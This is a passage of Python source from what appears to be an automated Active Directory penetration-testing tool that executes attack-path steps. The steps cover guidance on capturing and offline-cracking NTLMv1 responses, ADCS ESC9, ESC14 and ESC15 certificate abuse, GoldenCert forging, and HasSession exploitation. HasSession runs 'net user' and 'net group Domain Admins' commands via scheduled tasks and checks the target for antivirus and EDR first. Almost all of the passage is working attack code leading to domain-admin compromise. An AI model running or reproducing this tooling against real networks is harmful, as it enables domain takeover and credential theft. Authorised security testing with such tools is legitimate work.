            # in-band crack executor — this attack step has no relay/LDAP write.
            if is_crackntlmv1_relation(key):
                action_name = action or key
                if not from_label or not to_label:
                    print_warning(
                        f"Cannot execute {action_name}: missing from/to details."
                    )
                    return execution_started
                victim_ip = _resolve_step_victim_ip(shell, domain, to_label)
                print_panel(
                    (
                        "NTLMv1 is the most universal of the three avenues: it needs "
                        "no relay target and is unaffected by LDAP signing, channel "
                        "binding, ADCS, or DC count.\n\n"
                        f"1. Capture the victim's NTLMv1 challenge/response "
                        f"({mark_sensitive(victim_ip or to_label, 'host')}) using the "
                        "NTLMv1 capture sweep (coerce the host to authenticate to a "
                        "listener).\n"
                        "2. Crack the captured DES-based response OFFLINE "
                        "(crack.sh rainbow tables or hashcat mode 14000) to recover the "
                        "machine account NT hash.\n"
                        "3. The recovered machine hash is the compromise of this "
                        "computer; if it is a DC, it chains to DCSync via the graph."
                    ),
                    title="NTLMv1 Offline Crack — operator-guided",
                    border_style="cyan",
                )
                # Capture is automatable but lives in the NTLMv1 capture workflow;
                # the offline crack is out-of-band, so the step stays operator-guided
                # (no automatic exploited promotion — that happens when the recovered
                # hash is validated and recorded as a credential).
                continue

            if key == "adcsesc9":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC9: missing from/to details.")
                    return execution_started
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    _mark_blocked_step(
                        "ADCSESC9",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    _mark_blocked_step(
                        "ADCSESC9",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential",
                    )
                    return execution_started
                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    _mark_blocked_step(
                        "ADCSESC9",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started
                esc_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="9",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                template = esc_templates[0] if esc_templates else None
                if not template:
                    template = _prompt_for_manual_adcs_template(esc_number="9")
                if not template:
                    print_warning("No ESC9 template found or selected.")
                    return execution_started
                # ESC9 requires a puppet account: the writer modifies its UPN
                # and msDS-KeyCredentialLink to impersonate a privileged user.
                # The puppet is stored in vulnerable_resources with role=puppet
                # when the precondition collector derived the edge correctly.
                esc9_puppet = _resolve_esc9_puppet_user(details or {}, domain)
                if not esc9_puppet:
                    _mark_blocked_step(
                        "ADCSESC9",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason=(
                            "No puppet user found in edge notes. Re-collect to populate "
                            "the writer-mediated precondition before executing ESC9."
                        ),
                    )
                    print_warning(
                        "ESC9 execution blocked: puppet user precondition not met. "
                        "Re-run collection to resolve the writer->puppet->template chain."
                    )
                    return execution_started
                from adscan_internal.cli.privileged_target_selection import (
                    resolve_privileged_target_user,
                )

                esc9_target_user = resolve_privileged_target_user(
                    shell,
                    domain=domain,
                    purpose="ESC9 certificate request",
                )
                if not esc9_target_user:
                    print_warning(
                        "ESC9 execution cancelled: no privileged target selected."
                    )
                    return execution_started
                esc9_target_upn = f"{esc9_target_user}@{domain}"
                execution_started = True
                with _active_step_context(
                    action="ADCSESC9",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                        "puppet_account": esc9_puppet,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC9",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                                "puppet_account": esc9_puppet,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
                    from adscan_internal.services.adcs.esc_types import EscConfig

                    from adscan_internal.cli.adcs_exploitation import (
                        _resolve_template_min_key_size,
                    )

                    esc_cfg = EscConfig(
                        esc=9,
                        domain=domain,
                        auth_domain=domain,
                        dc_ip=str(domain_data.get("pdc") or ""),
                        auth_kdc=str(domain_data.get("pdc") or ""),
                        ca_host=str(
                            domain_data.get("adcs")
                            or domain_data.get("pdc_hostname")
                            or domain_data.get("pdc")
                            or ""
                        ),
                        ca_name=str(domain_data.get("ca") or ""),
                        template=template,
                        username=exec_username,
                        password=password,
                        target_upn=esc9_target_upn,
                        workspace_dir=_resolve_workspace_dir(shell, domain),
                        shell=shell,
                        ca_fqdn=_resolve_ca_fqdn(domain_data),
                        target_account=esc9_puppet,
                        target_account_dn=_resolve_esc9_puppet_dn(details or {}) or "",
                        dc_fqdn=(
                            domain_data.get("dc_fqdn")
                            or domain_data.get("pdc_hostname")
                            or None
                        ),
                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
                    )
                    esc9_result = run_esc_sync(esc_cfg)
                    if not esc9_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC9",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC9",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=esc9_target_upn,
                        esc_result=esc9_result,
                    )
                continue

            if key == "adcsesc14":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC14: missing from/to details.")
                    return execution_started
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    _mark_blocked_step(
                        "ADCSESC14",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    _mark_blocked_step(
                        "ADCSESC14",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential",
                    )
                    return execution_started
                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    _mark_blocked_step(
                        "ADCSESC14",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started
                esc_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="14",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                template = esc_templates[0] if esc_templates else None
                if not template:
                    template = _prompt_for_manual_adcs_template(esc_number="14")
                if not template:
                    print_warning("No ESC14 template found or selected.")
                    return execution_started
                execution_started = True
                with _active_step_context(
                    action="ADCSESC14",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC14",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
                    from adscan_internal.services.adcs.esc_types import EscConfig

                    esc14_puppet = _resolve_esc9_puppet_user(details or {}, domain)
                    if not esc14_puppet:
                        _mark_blocked_step(
                            "ADCSESC14",
                            from_label,
                            to_label,
                            kind="unavailable",
                            reason="No puppet account with writable altSecurityIdentities found in edge notes — re-run the collector to populate",
                        )
                        return execution_started
                    from adscan_internal.cli.adcs_exploitation import (
                        _resolve_template_min_key_size,
                    )

                    esc_cfg = EscConfig(
                        esc=14,
                        domain=domain,
                        auth_domain=domain,
                        dc_ip=str(domain_data.get("pdc") or ""),
                        auth_kdc=str(domain_data.get("pdc") or ""),
                        ca_host=str(
                            domain_data.get("adcs")
                            or domain_data.get("pdc_hostname")
                            or domain_data.get("pdc")
                            or ""
                        ),
                        ca_name=str(domain_data.get("ca") or ""),
                        template=template,
                        username=exec_username,
                        password=password,
                        target_upn=_resolve_target_upn(to_label, domain),
                        workspace_dir=_resolve_workspace_dir(shell, domain),
                        shell=shell,
                        ca_fqdn=_resolve_ca_fqdn(domain_data),
                        target_account=esc14_puppet,
                        target_account_dn=_resolve_esc9_puppet_dn(details or {}) or "",
                        dc_fqdn=(
                            domain_data.get("dc_fqdn")
                            or domain_data.get("pdc_hostname")
                            or None
                        ),
                        min_key_size=_resolve_template_min_key_size(shell, domain, "Machine"),
                    )
                    esc14_result = run_esc_sync(esc_cfg)
                    if not esc14_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC14",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC14",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=_resolve_target_upn(to_label, domain),
                        esc_result=esc14_result,
                    )
                continue

            if key == "adcsesc15":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC15: missing from/to details.")
                    return execution_started
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    _mark_blocked_step(
                        "ADCSESC15",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    _mark_blocked_step(
                        "ADCSESC15",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential",
                    )
                    return execution_started
                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    _mark_blocked_step(
                        "ADCSESC15",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started
                esc_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="15",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                template = esc_templates[0] if esc_templates else None
                if not template:
                    template = _prompt_for_manual_adcs_template(esc_number="15")
                if not template:
                    print_warning("No ESC15 template found or selected.")
                    return execution_started
                from adscan_internal.cli.privileged_target_selection import (
                    resolve_privileged_target_user,
                )

                esc15_target_user = resolve_privileged_target_user(
                    shell,
                    domain=domain,
                    purpose="ESC15 on-behalf-of certificate request",
                )
                if not esc15_target_user:
                    print_warning(
                        "ESC15 execution cancelled: no privileged target selected."
                    )
                    return execution_started
                esc15_target_upn = f"{esc15_target_user}@{domain}"
                execution_started = True
                with _active_step_context(
                    action="ADCSESC15",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC15",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
                    from adscan_internal.services.adcs.esc_types import EscConfig

                    from adscan_internal.cli.adcs_exploitation import (
                        _resolve_template_min_key_size,
                    )

                    esc_cfg = EscConfig(
                        esc=15,
                        domain=domain,
                        auth_domain=domain,
                        dc_ip=str(domain_data.get("pdc") or ""),
                        auth_kdc=str(domain_data.get("pdc") or ""),
                        ca_host=str(
                            domain_data.get("adcs")
                            or domain_data.get("pdc_hostname")
                            or domain_data.get("pdc")
                            or ""
                        ),
                        ca_name=str(domain_data.get("ca") or ""),
                        template=template,
                        username=exec_username,
                        password=password,
                        target_upn=esc15_target_upn,
                        workspace_dir=_resolve_workspace_dir(shell, domain),
                        shell=shell,
                        ca_fqdn=_resolve_ca_fqdn(domain_data),
                        dc_fqdn=(
                            domain_data.get("dc_fqdn")
                            or domain_data.get("pdc_hostname")
                            or None
                        ),
                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
                    )
                    esc15_result = run_esc_sync(esc_cfg)
                    if not esc15_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC15",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC15",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=esc15_target_upn,
                        esc_result=esc15_result,
                    )
                continue

            if key == "goldencert":
                if not from_label or not to_label:
                    print_warning("Cannot execute GoldenCert: missing from/to details.")
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute GoldenCert for {marked_domain}: missing PDC/CA info."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started

                exec_username = _resolve_golden_cert_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        "Cannot execute GoldenCert: no stored credential found for "
                        f"{marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                ca_target_host = _resolve_golden_cert_target_host(
                    shell,
                    domain=domain,
                    from_label=from_label,
                    domain_data=domain_data,
                )
                if not ca_target_host:
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute GoldenCert for {marked_domain}: CA host is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="CA host is not resolvable",
                    )
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="GoldenCert",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "ca_host": ca_target_host,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="GoldenCert",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "ca_host": ca_target_host,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    if hasattr(shell, "adcs_golden_cert"):
                        shell.adcs_golden_cert(  # type: ignore[attr-defined]
                            domain,
                            exec_username,
                            password,
                            ca_target_host,
                        )
                    else:
                        from adscan_internal.cli.adcs_exploitation import (
                            adcs_golden_cert,
                        )

                        adcs_golden_cert(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            ca_target_host=ca_target_host,
                        )
                    # GoldenCert returns no status flag; a captured-principal
                    # outcome emitted by adcs_golden_cert on Pass-the-Certificate
                    # success is the signal that the forged DA credential landed
                    # in the store. Promote it through the centralised helper so
                    # the next step runs as the impersonated DA, not the executor.
                    gold_outcome = get_last_ace_execution_outcome(shell) or {}
                    gold_principal = str(
                        gold_outcome.get("compromised_user") or ""
                    ).strip()
                    if gold_principal:
                        _handle_successful_credential_step(
                            "GoldenCert",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "ca_host": ca_target_host,
                            },
                            captured_principal=gold_principal,
                            credential_type=str(
                                gold_outcome.get("credential_type") or "nt_hash"
                            ),
                        )
                continue

            if key == "hassession":
                if not from_label or not to_label:
                    print_warning("Cannot execute HasSession: missing from/to details.")
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing from/to details",
                    )
                    return execution_started

                target_host, session_user = _resolve_hassession_host_and_user(
                    shell,
                    domain=domain,
                    from_label=from_label,
                    to_label=to_label,
                )
                if not target_host:
                    print_warning(
                        "Cannot execute HasSession: session host is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Session host is not resolvable",
                    )
                    return execution_started
                if not session_user or not _is_valid_domain_username(
                    session_user, allow_machine=True
                ):
                    print_warning(
                        "Cannot execute HasSession: session user is not resolvable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Session user is not resolvable",
                    )
                    return execution_started

                if (
                    ensure_host_bound_workflow_target_viable(
                        shell,
                        domain=domain,
                        target_host=target_host,
                        workflow_label="HasSession exploitation",
                        service="smb",
                        resume_after_pivot=True,
                    )
                    is None
                ):
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="blocked",
                        reason="Session host is not reachable from the current vantage",
                    )
                    return execution_started

                exec_username, password, exec_context_source = (
                    _resolve_hassession_execution_user(
                        shell,
                        domain=domain,
                        summary=summary,
                        steps=steps,
                        current_step_index=idx - 1,
                        target_host=target_host,
                        from_label=from_label,
                        context_username=context_username,
                        context_password=context_password,
                    )
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        "Cannot execute HasSession: no stored credential found for "
                        f"{marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started
                if exec_context_source == "generic_context":
                    print_info_debug(
                        "[hassession] No prior host-access credential context "
                        "for this host; using generic execution credential context."
                    )

                non_interactive = is_non_interactive(shell)
                create_new_user = True
                if not non_interactive and hasattr(shell, "_questionary_select"):
                    options = [
                        "Create new domain user, then add to Domain Admins (Recommended)",
                        "Add existing domain user to Domain Admins",
                        "Cancel",
                    ]
                    choice = shell._questionary_select(
                        "HasSession exploitation mode:",
                        options,
                        default_idx=0,
                    )
                    if choice is None or choice >= len(options) - 1:
                        return execution_started
                    create_new_user = choice == 0
                elif not non_interactive:
                    create_new_user = Confirm.ask(
                        "Create a new domain user and add it to Domain Admins?",
                        default=True,
                    )

                target_user = ""
                target_password: str | None = None
                if create_new_user:
                    default_user = _generate_default_hassession_username()
                    if non_interactive:
                        selected_user = default_user
                    else:
                        selected_user = Prompt.ask(
                            "New domain username to create",
                            default=default_user,
                        ).strip()
                    selected_user = _normalize_account(selected_user)
                    if not _is_valid_domain_username(selected_user):
                        print_warning(
                            "Cannot execute HasSession: invalid new username. "
                            "Use 1-20 chars with letters, digits, dot, underscore or hyphen."
                        )
                        return execution_started

                    # New account does not exist yet (no per-user PSO), so resolve
                    # the domain-default policy (target_user=None) and generate a
                    # compliant password through the canonical generator.
                    new_user_policy = _resolve_password_policy_for_execution(
                        shell,
                        domain=domain,
                        target_user=None,
                        username=exec_username,
                        password=password,
                    )
                    generated_password = generate_compliant_password(
                        new_user_policy, machine=False
                    )
                    if non_interactive:
                        selected_password = generated_password
                    else:
                        selected_password = Prompt.ask(
                            "Password for the new domain user",
                            default=generated_password,
                        ).strip()
                    policy_ok, policy_unmet = validate_against_policy(
                        selected_password, new_user_policy
                    )
                    if not policy_ok:
                        print_warning(
                            "Cannot execute HasSession: the chosen password does not "
                            "satisfy the domain password policy "
                            f"({'; '.join(policy_unmet) or 'complexity/length'})."
                        )
                        return execution_started
                    target_user = selected_user
                    target_password = selected_password
                else:
                    stored_creds = (
                        getattr(shell, "domains_data", {})
                        .get(domain, {})
                        .get("credentials", {})
                    )
                    credential_users = (
                        sorted(
                            {
                                str(user).strip()
                                for user in stored_creds.keys()
                                if isinstance(user, str)
                                and _is_valid_domain_username(_normalize_account(user))
                            },
                            key=str.lower,
                        )
                        if isinstance(stored_creds, dict)
                        else []
                    )
                    if non_interactive:
                        selected_user = exec_username
                    elif hasattr(shell, "_questionary_select") and credential_users:
                        options = credential_users + ["Enter username", "Cancel"]
                        selected_idx = shell._questionary_select(
                            "Select the user to elevate to Domain Admins:",
                            options,
                            default_idx=0,
                        )
                        if selected_idx is None or selected_idx >= len(options) - 1:
                            return execution_started
                        if selected_idx == len(options) - 2:
                            selected_user = Prompt.ask(
                                "Existing username to add to Domain Admins",
                                default=exec_username,
                            ).strip()
                        else:
                            selected_user = options[selected_idx]
                    else:
                        selected_user = Prompt.ask(
                            "Existing username to add to Domain Admins",
                            default=exec_username,
                        ).strip()
                    target_user = _normalize_account(selected_user)
                    if not _is_valid_domain_username(target_user):
                        print_warning(
                            "Cannot execute HasSession: invalid target username."
                        )
                        return execution_started

                group_candidates = _resolve_domain_admin_group_candidates(shell, domain)
                if not group_candidates:
                    group_candidates = ["Domain Admins", "Admins. del dominio"]

                marked_host = mark_sensitive(target_host, "hostname")
                marked_session_user = mark_sensitive(session_user, "user")
                marked_exec_user = mark_sensitive(exec_username, "user")
                marked_target_user = mark_sensitive(target_user, "user")
                mode_label = "create+addmember" if create_new_user else "addmember"
                print_panel(
                    "\n".join(
                        [
                            f"Domain: {mark_sensitive(domain, 'domain')}",
                            f"Target host: {marked_host}",
                            f"Session user: {marked_session_user}",
                            f"Executor: {marked_exec_user}",
                            f"Mode: {mode_label}",
                            f"Target user: {marked_target_user}",
                        ]
                    ),
                    title=Text(
                        "HasSession Exploitation Plan",
                        style=f"bold {BRAND_COLORS['info']}",
                    ),
                    border_style=BRAND_COLORS["info"],
                    expand=False,
                )

                if not non_interactive and not Confirm.ask(
                    "Execute HasSession exploitation now?",
                    default=True,
                ):
                    return execution_started

                # AV/EDR pre-check gate — fingerprint the target host once
                # and surface Defender/EDR state before the schtask payload
                # ever fires. Operator decides whether to proceed (informed,
                # not blocked).
                gate_decision = _hassession_av_edr_gate(
                    shell,
                    domain=domain,
                    target_host=target_host,
                    target_user=target_user,
                    session_user=session_user,
                    exec_username=exec_username,
                    exec_password=password,
                    non_interactive=non_interactive,
                )
                if gate_decision == "abort":
                    return execution_started

                execution_started = True
                hassession_step_failed = False
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "target_host": target_host,
                        "session_user": session_user,
                        "target_user": target_user,
                        "mode": mode_label,
                        "exec_context_source": exec_context_source,
                    },
                ):
                    # Track what we actually created so the finally rollback
                    # knows exactly what to clean up.
                    _hs_user_created_by_us: bool = False
                    _hs_user_added_to_da: bool = False

                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "target_host": target_host,
                                "session_user": session_user,
                                "target_user": target_user,
                                "mode": mode_label,
                                "exec_context_source": exec_context_source,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    command_failed = False
                    if create_new_user and target_password is not None:
                        create_command = (
                            f'net user "{target_user}" "{target_password}" /add /domain'
                        )
                        create_ok, create_output = _run_hassession_schtask_command(
                            shell,
                            domain=domain,
                            exec_username=exec_username,
                            exec_password=password,
                            target_host=target_host,
                            session_user=session_user,
                            command_to_run=create_command,
                            log_suffix="create_user",
                        )
                        if create_ok:
                            _hs_user_created_by_us = True
                            # Write crash-recovery checkpoint immediately after
                            # creating the account so even a mid-step crash
                            # leaves a recoverable record.
                            _write_hassession_cleanup_checkpoint(
                                shell,
                                domain=domain,
                                target_user=target_user,
                                target_password=target_password,
                                target_host=target_host,
                                session_user=session_user,
                                exec_username=exec_username,
                                exec_password=password,
                                user_created_by_us=True,
                                group_candidates=group_candidates,
                            )
                        else:
                            lowered = create_output.lower()
                            already_exists = any(
                                marker in lowered
                                for marker in (
                                    "account already exists",
                                    "ya existe",
                                    "el usuario ya existe",
                                    "2224",
                                )
                            )
                            if already_exists:
                                print_warning(
                                    "Target user already exists. Continuing with group escalation."
                                )
                            else:
                                print_warning(
                                    "HasSession user-creation command did not complete successfully."
                                )
                                command_failed = True

                    verified_da = False
                    selected_group: str | None = None
                    waited_for_membership = False
                    if not command_failed:
                        for group_name in group_candidates:
                            add_command = (
                                f'net group "{group_name}" "{target_user}" /add /domain'
                            )
                            add_ok, _ = _run_hassession_schtask_command(
                                shell,
                                domain=domain,
                                exec_username=exec_username,
                                exec_password=password,
                                target_host=target_host,
                                session_user=session_user,
                                command_to_run=add_command,
                                log_suffix=f"addmember_{group_name}",
                            )
                            if not add_ok:
                                continue
                            _hs_user_added_to_da = True
                            if not waited_for_membership:
                                _wait_for_hassession_membership_propagation(
                                    shell,
                                    domain=domain,
                                    target_user=target_user,
                                )
                                waited_for_membership = True
                            membership = _is_user_domain_admin_via_sid(
                                shell,
                                domain=domain,
                                target_user=target_user,
                                auth_username=exec_username,
                                auth_password=password,
                            )
                            if membership is True:
                                verified_da = True
                                selected_group = group_name
                                break

                    if not verified_da and not command_failed:
                        if not waited_for_membership:
                            _wait_for_hassession_membership_propagation(
                                shell,
                                domain=domain,
                                target_user=target_user,
                            )
                        membership = _is_user_domain_admin_via_sid(
                            shell,
                            domain=domain,
                            target_user=target_user,
                            auth_username=exec_username,
                            auth_password=password,
                        )
                        verified_da = membership is True

                    if verified_da:
                        # Centralised success transition + credential handoff.
                        # The generated account is promoted into the in-path
                        # execution context (so a downstream step in the same
                        # run executes as the new DA). NOTE: the rollback below
                        # deletes this account on every run, so the promotion is
                        # only usable by steps executed before rollback; the
                        # handoff is still routed here so the invariant holds and
                        # the edge-status transition is centralised.
                        _handle_successful_credential_step(
                            action,
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "target_host": target_host,
                                "session_user": session_user,
                                "target_user": target_user,
                                "mode": mode_label,
                                "group": selected_group or "RID-512",
                                "exec_context_source": exec_context_source,
                            },
                            captured_principal=target_user,
                            captured_credential=target_password,
                            credential_type="password",
                        )

                        print_info(
                            "HasSession escalation confirmed: "
                            f"{mark_sensitive(target_user, 'user')} is now in "
                            "Domain Admins (RID 512)."
                        )
                        if hasattr(shell, "add_credential"):
                            credential_to_register = target_password or (
                                _get_stored_domain_credential_for_user(
                                    shell, domain=domain, username=target_user
                                )
                            )
                            if credential_to_register:
                                add_credential_fn = getattr(
                                    shell, "add_credential", None
                                )
                                if callable(add_credential_fn):
                                    add_credential_fn(
                                        domain,
                                        target_user,
                                        credential_to_register,
                                    )
                            else:
                                print_info_debug(
                                    "[hassession] Escalation verified but no stored credential "
                                    f"available for {mark_sensitive(target_user, 'user')}; "
                                    "skipping add_credential post-flow trigger."
                                )
                    else:
                        try:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action,
                                to_label=to_label,
                                status="failed",
                                notes={
                                    "username": exec_username,
                                    "target_host": target_host,
                                    "session_user": session_user,
                                    "target_user": target_user,
                                    "mode": mode_label,
                                    "exec_context_source": exec_context_source,
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)
                        print_warning(
                            "HasSession exploitation executed, but Domain Admin "
                            "membership could not be verified."
                        )
                        hassession_step_failed = True

                    # Rollback — runs on success AND failure. If nothing was
                    # created or modified this is a no-op. Crash recovery is
                    # handled separately via the checkpoint file; this covers
                    # the normal execution path (happy and sad).
                    if _hs_user_created_by_us or _hs_user_added_to_da:
                        _run_hassession_rollback(
                            shell,
                            domain=domain,
                            exec_username=exec_username,
                            exec_password=password,
                            target_host=target_host,
                            session_user=session_user,
                            target_user=target_user,
                            target_password=target_password,
                            user_created_by_us=_hs_user_created_by_us,
                            group_candidates=group_candidates,
                            non_interactive=non_interactive,
                        )
                        _clear_hassession_cleanup_checkpoint(shell, domain=domain)
                if hassession_step_failed:
                    # The privileged membership the downstream steps depend on
                    # was never established (and was rolled back) — halt instead
                    # of attempting doomed follow-ups.
                    _halt_path_after_failed_step(
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_index=idx,
                        executable_step_position=executable_step_position,
                        actor=exec_username,
                    )
                    break
                continue

            if key == "allowedtodelegate":
                if not from_label or not to_label:
                    print_warning(
                        "Cannot execute AllowedToDelegate: missing from/to details."
                    )
                    return execution_started

                # Prefer running with the provided context credential. Otherwise try to use the
                # credential for the source node when available.
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                execution_started = True

                with _active_step_context(
                    action="AllowedToDelegate",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="AllowedToDelegate",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    # The actual SPN being delegated to (e.g.
                    # "CIFS/winterfell.north.sevenkingdoms.local") is stored
                    # in the edge notes as `delegated_spn` by the collector.
